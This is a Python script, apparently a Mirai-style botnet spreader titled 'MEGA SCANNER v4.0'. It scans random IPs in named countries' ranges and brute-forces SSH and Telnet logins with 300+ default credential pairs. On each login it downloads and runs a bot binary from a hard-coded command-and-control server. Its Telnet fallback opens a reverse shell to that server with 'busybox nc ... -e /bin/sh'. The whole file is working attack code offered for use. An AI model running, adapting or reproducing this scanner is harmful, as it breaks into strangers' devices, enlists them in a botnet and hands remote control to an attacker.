import socket
import time
import random
import threading
import paramiko
import telnetlib
import sys

# =============================================
# CONFIGURACIÓN
# =============================================
CNC_IP = "172.96.140.62"
CNC_PORT = 14037
DOWNLOAD_URL = "http://172.96.140.62:1283/bins/x86_64"

# =============================================
# MEGA COMBO DE CREDENCIALES (300+)
# =============================================
MEGA_CREDS = [
    # === DEFAULT/EMPTY (30) ===
    ("root", ""), ("admin", ""), ("", ""),
    ("root", None), ("admin", None), 
    ("user", ""), ("guest", ""), ("test", ""),
    ("operator", ""), ("service", ""), ("support", ""),
    ("manager", ""), ("sysadmin", ""), ("system", ""),
    ("administrator", ""), ("superuser", ""), ("supervisor", ""),
    ("backup", ""), ("default", ""), ("debug", ""),
    ("ftp", ""), ("http", ""), ("https", ""),
    ("mysql", ""), ("oracle", ""), ("postgres", ""),
    ("sql", ""), ("web", ""), ("www", ""), ("www-data", ""),
    
    # === NUMÉRICAS (50) ===
    ("root", "123456"), ("admin", "123456"),
    ("root", "12345678"), ("admin", "12345678"),
    ("root", "123456789"), ("admin", "123456789"),
    ("root", "1234567890"), ("admin", "1234567890"),
    ("root", "12345"), ("admin", "12345"),
    ("root", "1234"), ("admin", "1234"),
    ("root", "123"), ("admin", "123"),
    ("root", "1234567"), ("admin", "1234567"),
    ("root", "0123456789"), ("admin", "0123456789"),
    ("root", "000000"), ("admin", "000000"),
    ("root", "00000000"), ("admin", "00000000"),
    ("root", "111111"), ("admin", "111111"),
    ("root", "11111111"), ("admin", "11111111"),
    ("root", "222222"), ("admin", "222222"),
    ("root", "333333"), ("admin", "333333"),
    ("root", "444444"), ("admin", "444444"),
    ("root", "555555"), ("admin", "555555"),
    ("root", "666666"), ("admin", "666666"),
    ("root", "777777"), ("admin", "777777"),
    ("root", "888888"), ("admin", "888888"),
    ("root", "999999"), ("admin", "999999"),
    ("root", "121212"), ("admin", "121212"),
    ("root", "131313"), ("admin", "131313"),
    ("root", "123123"), ("admin", "123123"),
    ("root", "123321"), ("admin", "123321"),
    ("root", "654321"), ("admin", "654321"),
    ("root", "66666666"), ("admin", "66666666"),
    ("root", "88888888"), ("admin", "88888888"),
    
    # === PASSWORDS DE FÁBRICA (40) ===
    ("root", "password"), ("admin", "password"),
    ("root", "pass"), ("admin", "pass"),
    ("root", "passwd"), ("admin", "passwd"),
    ("root", "PASSWORD"), ("admin", "PASSWORD"),
    ("root", "Password"), ("admin", "Password"),
    ("root", "P@ssw0rd"), ("admin", "P@ssw0rd"),
    ("root", "p@ssw0rd"), ("admin", "p@ssw0rd"),
    ("root", "admin123"), ("admin", "admin123"),
    ("root", "admin1234"), ("admin", "admin1234"),
    ("root", "admin12345"), ("admin", "admin12345"),
    ("root", "admin123456"), ("admin", "admin123456"),
    ("root", "admin12345678"), ("admin", "admin12345678"),
    ("root", "root123"), ("admin", "admin123"),
    ("root", "root1234"), ("admin", "admin1234"),
    ("root", "root123456"), ("admin", "admin123456"),
    ("root", "rootpassword"), ("admin", "adminpassword"),
    ("root", "toor"), ("root", "r00t"),
    ("root", "changeme"), ("admin", "changeme"),
    ("root", "default"), ("admin", "default"),
    ("root", "letmein"), ("admin", "letmein"),
    ("root", "welcome"), ("admin", "welcome"),
    ("root", "access"), ("admin", "access"),
    
    # === CÁMARAS IP CHINAS (30) ===
    ("root", "xc3511"), ("root", "vizxv"),
    ("root", "jvbzd"), ("root", "anko"),
    ("root", "Zte521"), ("root", "hi3518"),
    ("root", "7ujMko0admin"), ("root", "7ujMko0vizxv"),
    ("root", "7ujMko0admin123"), ("root", "j1/_7sxw"),
    ("root", "ikwb"), ("root", "dreambox"),
    ("root", "realtek"), ("root", "00000000"),
    ("root", "1111111"), ("root", "1234"),
    ("root", "666666"), ("root", "888888"),
    ("admin", "1111"), ("admin", "2222"),
    ("admin", "3333"), ("admin", "4444"),
    ("admin", "5555"), ("admin", "6666"),
    ("admin", "7777"), ("admin", "8888"),
    ("admin", "9999"), ("admin", "4321"),
    ("admin", "1234admin"), ("admin", "admin1234"),
    
    # === ROUTERS/DVR/NVR (40) ===
    ("admin", "admin"), ("Admin", "admin"),
    ("admin", "password1"), ("admin", "password123"),
    ("admin", "adminadmin"), ("admin", "administrator"),
    ("administrator", "admin"), ("user", "user"),
    ("guest", "guest"), ("support", "support"),
    ("service", "service"), ("tech", "tech"),
    ("operator", "operator"), ("manager", "manager"),
    ("supervisor", "supervisor"), ("security", "security"),
    ("monitor", "monitor"), ("control", "control"),
    ("D-Link", ""), ("dlink", "dlink"),
    ("netgear", "netgear"), ("linksys", "linksys"),
    ("zyxel", "zyxel"), ("tplink", "tplink"),
    ("huawei", "huawei"), ("zte", "zte"),
    ("alcatel", "alcatel"), ("motorola", "motorola"),
    ("cisco", "cisco"), ("cisco", "cisco123"),
    ("hp", "hp"), ("siemens", "siemens"),
    ("samsung", "samsung"), ("sony", "sony"),
    ("panasonic", "panasonic"), ("sharp", "sharp"),
    ("foscam", ""), ("foscam", "foscam"),
    
    # === LINUX/RASPBERRY (20) ===
    ("pi", "raspberry"), ("raspberry", "raspberry"),
    ("raspbian", "raspbian"), ("debian", "debian"),
    ("ubuntu", "ubuntu"), ("linux", "linux"),
    ("centos", "centos"), ("fedora", "fedora"),
    ("redhat", "redhat"), ("oracle", "oracle"),
    ("opensuse", "opensuse"), ("arch", "arch"),
    ("gentoo", "gentoo"), ("kali", "kali"),
    ("backbox", "backbox"), ("parrot", "parrot"),
    ("docker", "docker"), ("vagrant", "vagrant"),
    ("ansible", "ansible"), ("jenkins", "jenkins"),
    
    # === QWERTY/KEYBOARD (30) ===
    ("root", "qwerty"), ("admin", "qwerty"),
    ("root", "qwerty123"), ("admin", "qwerty123"),
    ("root", "qwertyuiop"), ("admin", "qwertyuiop"),
    ("root", "qwerty123456"), ("admin", "qwerty123456"),
    ("root", "qazwsx"), ("admin", "qazwsx"),
    ("root", "qazwsxedc"), ("admin", "qazwsxedc"),
    ("root", "1q2w3e4r"), ("admin", "1q2w3e4r"),
    ("root", "1q2w3e4r5t"), ("admin", "1q2w3e4r5t"),
    ("root", "1qaz2wsx"), ("admin", "1qaz2wsx"),
    ("root", "zaq12wsx"), ("admin", "zaq12wsx"),
    ("root", "!qaz2wsx"), ("admin", "!qaz2wsx"),
    ("root", "1qaz@wsx"), ("admin", "1qaz@wsx"),
    ("root", "abc123"), ("admin", "abc123"),
    ("root", "abc123456"), ("admin", "abc123456"),
    ("root", "abcd1234"), ("admin", "abcd1234"),
    ("root", "asdfgh"), ("admin", "asdfgh"),
    
    # === PATRONES (20) ===
    ("root", "password123"), ("admin", "password123"),
    ("root", "pass123"), ("admin", "pass123"),
    ("root", "pass@123"), ("admin", "pass@123"),
    ("root", "admin@123"), ("admin", "admin@123"),
    ("root", "root@123"), ("admin", "admin@123"),
    ("root", "welcome123"), ("admin", "welcome123"),
    ("root", "test123"), ("admin", "test123"),
    ("root", "123qwe"), ("admin", "123qwe"),
    ("root", "1234qwer"), ("admin", "1234qwer"),
    ("root", "12345qwert"), ("admin", "12345qwert"),
    
    # === ESPECÍFICAS DE MARCAS (30) ===
    ("root", "smcadmin"), ("admin", "smcadmin"),
    ("root", "3paradm"), ("admin", "3pardata"),
    ("root", "3pardata"), ("admin", "3paradm"),
    ("root", "hitachi"), ("admin", "hitachi"),
    ("root", "sun"), ("admin", "sun"),
    ("root", "hpadmin"), ("admin", "hpadmin"),
    ("root", "ibm"), ("admin", "ibm"),
    ("root", "dell"), ("admin", "dell"),
    ("root", "lenovo"), ("admin", "lenovo"),
    ("root", "asus"), ("admin", "asus"),
    ("root", "acer"), ("admin", "acer"),
    ("root", "toshiba"), ("admin", "toshiba"),
    ("root", "fujitsu"), ("admin", "fujitsu"),
    ("root", "nec"), ("admin", "nec"),
    ("root", "siemens123"), ("admin", "siemens123"),
    ("root", "basler"), ("admin", "basler"),
    ("root", "axis"), ("admin", "axis"),
    ("root", "vivotek"), ("admin", "vivotek"),
    
    # === MISC/OTROS (30) ===
    ("root", "master"), ("admin", "master"),
    ("root", "god"), ("admin", "god"),
    ("root", "love"), ("admin", "love"),
    ("root", "secret"), ("admin", "secret"),
    ("root", "private"), ("admin", "private"),
    ("root", "test"), ("admin", "test"),
    ("root", "demo"), ("admin", "demo"),
    ("root", "temp"), ("admin", "temp"),
    ("root", "backup"), ("admin", "backup"),
    ("root", "bin"), ("admin", "bin"),
    ("root", "daemon"), ("admin", "daemon"),
    ("root", "nobody"), ("admin", "nobody"),
    ("root", "games"), ("admin", "games"),
    ("root", "man"), ("admin", "man"),
    ("root", "lp"), ("admin", "lp"),
    ("root", "mail"), ("admin", "mail"),
    ("root", "news"), ("admin", "news"),
    ("root", "uucp"), ("admin", "uucp"),
    ("root", "proxy"), ("admin", "proxy"),
    ("root", "www"), ("admin", "www"),
    ("root", "backup"), ("admin", "backup"),
    ("root", "list"), ("admin", "list"),
    ("root", "irc"), ("admin", "irc"),
    ("root", "gnats"), ("admin", "gnats"),
    
    # === ESPECIALES (20) ===
    ("root", "!@#$%^&*"), ("admin", "!@#$%^&*"),
    ("root", "!@#$%^&*()"), ("admin", "!@#$%^&*()"),
    ("root", "!@#$%^"), ("admin", "!@#$%^"),
    ("root", "~!@#$%^&*"), ("admin", "~!@#$%^&*"),
    ("root", "P@$$w0rd"), ("admin", "P@$$w0rd"),
    ("root", "p@$$w0rd"), ("admin", "p@$$w0rd"),
    ("root", "Admin123!"), ("admin", "Admin123!"),
    ("root", "Root123!"), ("admin", "Admin123!"),
    ("root", "Summer2024!"), ("admin", "Summer2024!"),
    ("root", "Winter2024!"), ("admin", "Winter2024!"),
    ("root", "Spring2024!"), ("admin", "Spring2024!"),
]

# =============================================
# RANGOS CALIENTES
# =============================================
HOT_RANGES = [
    # BRASIL (los que funcionan)
    ("187.0.0.0", "187.63.255.255"),
    ("177.0.0.0", "177.15.255.255"),
    ("179.0.0.0", "179.31.255.255"),
    ("189.0.0.0", "189.63.255.255"),
    ("200.0.0.0", "200.31.255.255"),
    
    # CHINA
    ("123.56.0.0", "123.63.255.255"),
    ("123.116.0.0", "123.119.255.255"),
    ("58.32.0.0", "58.63.255.255"),
    ("60.0.0.0", "60.63.255.255"),
    
    # MÉXICO
    ("187.0.0.0", "187.63.255.255"),
    ("201.0.0.0", "201.31.255.255"),
    
    # INDIA
    ("115.96.0.0", "115.111.255.255"),
    
    # REDES PRIVADAS
    ("192.168.1.0", "192.168.1.255"),
    ("192.168.0.0", "192.168.0.255"),
    ("10.0.0.0", "10.0.255.255"),
]

# =============================================
# CLASE SCANNER MEJORADA
# =============================================
class MegaScanner:
    def __init__(self):
        self.running = True
        self.lock = threading.Lock()
        self.stats = {
            'scanned': 0,
            'hits': 0,
            'ssh_hits': 0,
            'telnet_hits': 0,
            'failed': 0,
            'start': time.time()
        }
        
        # Separar creds para SSH y Telnet
        self.ssh_creds = MEGA_CREDS[:]
        self.telnet_creds = MEGA_CREDS[:]
        random.shuffle(self.ssh_creds)
        random.shuffle(self.telnet_creds)
        
    def generate_ip(self):
        """Genera IP en rango caliente"""
        start_range, end_range = random.choice(HOT_RANGES)
        start = list(map(int, start_range.split('.')))
        end = list(map(int, end_range.split('.')))
        
        ip_parts = []
        for i in range(4):
            ip_parts.append(str(random.randint(start[i], end[i])))
        return ".".join(ip_parts)
    
    def check_port(self, ip, port, timeout=0.5):
        """Check rápido de puerto"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def attack_ssh(self, ip, port=22):
        """Ataque SSH con MEGA CREDS"""
        # Tomar muestra de 50 creds (no todas)
        creds_sample = random.sample(self.ssh_creds, min(50, len(self.ssh_creds)))
        
        for username, password in creds_sample:
            if not self.running:
                return False
                
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Manejar None password
                pwd = "" if password is None else password
                
                ssh.connect(
                    ip, port, 
                    username=username, 
                    password=pwd,
                    timeout=3,
                    banner_timeout=5,
                    look_for_keys=False,
                    allow_agent=False,
                    compress=True
                )
                
                # ¡ÉXITO!
                print(f"\n[🔥 SSH HIT] {ip}:{port}")
                print(f"   User: {username} | Pass: {password if password else '(empty)'}")
                print(f"   Action: Downloading x86_64 bot...")
                
                # COMANDO SSH: Descargar y ejecutar
                cmd = f"cd /tmp && wget -q {DOWNLOAD_URL} -O .x && chmod +x .x && ./.x &"
                try:
                    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=2)
                    # Leer output para evitar bloqueos
                    stdout.read()
                except:
                    pass
                
                ssh.close()
                
                with self.lock:
                    self.stats['hits'] += 1
                    self.stats['ssh_hits'] += 1
                
                return True
                
            except paramiko.AuthenticationException:
                continue
            except paramiko.SSHException as e:
                if "Error reading SSH protocol banner" in str(e):
                    break
                continue
            except (socket.timeout, EOFError, ConnectionResetError):
                break
            except Exception:
                continue
        
        return False
    
    def attack_telnet(self, ip, port=23):
        """Ataque Telnet con MEGA CREDS"""
        # Tomar muestra de 40 creds
        creds_sample = random.sample(self.telnet_creds, min(40, len(self.telnet_creds)))
        
        for username, password in creds_sample:
            if not self.running:
                return False
                
            try:
                tn = telnetlib.Telnet(ip, port, timeout=2)
                
                # Limpiar buffer inicial
                tn.read_very_eager()
                time.sleep(0.1)
                
                # Enviar usuario
                user_bytes = (username if username else "").encode()
                tn.write(user_bytes + b"\n")
                time.sleep(0.2)
                
                # Enviar password
                pass_bytes = (password if password else "").encode()
                tn.write(pass_bytes + b"\n")
                time.sleep(0.3)
                
                # Verificar acceso
                tn.write(b"echo OK\n")
                time.sleep(0.2)
                
                data = tn.read_very_eager()
                if b"OK" in data or b"#" in data or b"$" in data or b">" in data:
                    print(f"\n[🔥 TELNET HIT] {ip}:{port}")
                    print(f"   User: {username} | Pass: {password if password else '(empty)'}")
                    print(f"   Action: Connecting to CNC...")
                    
                    # COMANDO TELNET: Conectar a CNC
                    cnc_cmds = [
                        b"cd /tmp\n",
                        f"wget -q {DOWNLOAD_URL} -O cnc\n".encode(),
                        b"chmod +x cnc\n",
                        f"./cnc {CNC_IP} {CNC_PORT} &\n".encode(),
                        b"exit\n"
                    ]
                    
                    # Alternativa con busybox nc
                    alt_cmd = f"busybox nc {CNC_IP} {CNC_PORT} -e /bin/sh &\n".encode()
                    cnc_cmds.append(alt_cmd)
                    
                    for cmd in cnc_cmds:
                        try:
                            tn.write(cmd)
                            time.sleep(0.1)
                        except:
                            pass
                    
                    tn.close()
                    
                    with self.lock:
                        self.stats['hits'] += 1
                        self.stats['telnet_hits'] += 1
                    
                    return True
                
                tn.close()
                
            except:
                continue
        
        return False
    
    def worker(self, worker_id):
        """Worker principal"""
        print(f"[Thread {worker_id}] Started")
        
        ports_to_check = [
            (23, 'telnet'),  # Prioridad 1: Telnet
            (2323, 'telnet'),
            (23231, 'telnet'),
            (22, 'ssh'),     # Prioridad 2: SSH
            (2222, 'ssh'),
            (22222, 'ssh'),
        ]
        
        while self.running:
            ip = self.generate_ip()
            
            for port, service in ports_to_check:
                if not self.running:
                    break
                    
                if self.check_port(ip, port, timeout=0.3):
                    if service == 'telnet':
                        self.attack_telnet(ip, port)
                    else:
                        self.attack_ssh(ip, port)
                    break  # Si encontramos un puerto, no checkear más
            
            with self.lock:
                self.stats['scanned'] += 1
            
            # Stats cada 500 IPs
            if self.stats['scanned'] % 500 == 0:
                self.show_stats()
    
    def show_stats(self):
        """Mostrar estadísticas"""
        elapsed = time.time() - self.stats['start']
        
        with self.lock:
            scanned = self.stats['scanned']
            hits = self.stats['hits']
            ssh = self.stats['ssh_hits']
            telnet = self.stats['telnet_hits']
        
        if elapsed > 0:
            rate = scanned / elapsed
            hit_rate = (hits / scanned) * 100 if scanned > 0 else 0
            
            print(f"\n{'='*60}")
            print(f"[📊] MEGA SCANNER STATS")
            print(f"{'='*60}")
            print(f"[⏱️] Time: {elapsed:.0f}s")
            print(f"[⚡] Speed: {rate*60:.0f} IPs/min")
            print(f"[🔍] Scanned: {scanned:,}")
            print(f"[🎯] Hits: {hits} (SSH: {ssh}, Telnet: {telnet})")
            print(f"[📈] Hit Rate: {hit_rate:.4f}%")
            print(f"[🔄] Est. next hit: {int((100/hit_rate - elapsed) if hit_rate > 0 else 0)}s")
            print(f"[💾] Credentials: {len(MEGA_CREDS)}")
            print(f"[🎲] Running threads: {threading.active_count()}")
            print(f"{'='*60}")
    
    def start(self, threads=400):
        """Iniciar escaneo masivo"""
        print(f"""
╔══════════════════════════════════════════════╗
║           MEGA SCANNER v4.0                  ║
║           ====================               ║
║   🔥  300+ Credenciales                     ║
║   ⚡  {threads} Threads - Ultra rápido       ║
║   🎯  SSH: Download bot                     ║
║   📡  Telnet: Connect to CNC                ║
║   ====================                       ║
╚══════════════════════════════════════════════╝

[📡] Target URL: {DOWNLOAD_URL}
[📡] CNC: {CNC_IP}:{CNC_PORT}
[🔥] Credentials: {len(MEGA_CREDS)} combos
[⚡] Threads: {threads}
[🎯] Starting in 3 seconds...""")
        
        time.sleep(3)
        
        # Iniciar workers
        worker_threads = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(i+1,), daemon=True)
            t.start()
            worker_threads.append(t)
            if i % 50 == 0:
                time.sleep(0.05)
        
        print(f"\n[✅] {len(worker_threads)} workers active!")
        print("[📊] Stats every 500 IPs")
        print("[🔥] SCANNING WITH MEGA CREDS...\n")
        
        # Loop principal
        try:
            while True:
                time.sleep(5)
                self.show_stats()
                
        except KeyboardInterrupt:
            print("\n[!] Stopping scanner...")
            self.running = False
            
            # Esperar a que terminen
            for t in worker_threads:
                t.join(timeout=1)
            
            print(f"\n[📊] FINAL STATISTICS:")
            print(f"    Total IPs scanned: {self.stats['scanned']:,}")
            print(f"    Total hits: {self.stats['hits']}")
            print(f"    SSH hits: {self.stats['ssh_hits']}")
            print(f"    Telnet hits: {self.stats['telnet_hits']}")
            print(f"    Total time: {time.time() - self.stats['start']:.0f}s")
            print(f"    Average speed: {self.stats['scanned']/(time.time() - self.stats['start'])*60:.0f} IPs/min")

# =============================================
# EJECUTAR
# =============================================
if __name__ == "__main__":
    # Limpiar pantalla
    import os
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Crear y ejecutar scanner
    scanner = MegaScanner()
    
    # Ajustar threads según tu máquina
    threads = 400  # Ajusta: 100-500 para PC normal, 50-150 para Android
    
    try:
        scanner.start(threads)
    except Exception as e:
        print(f"\n[❌] Error: {e}")
        print("[!] Make sure you have paramiko installed:")
        print("    pip install paramiko")
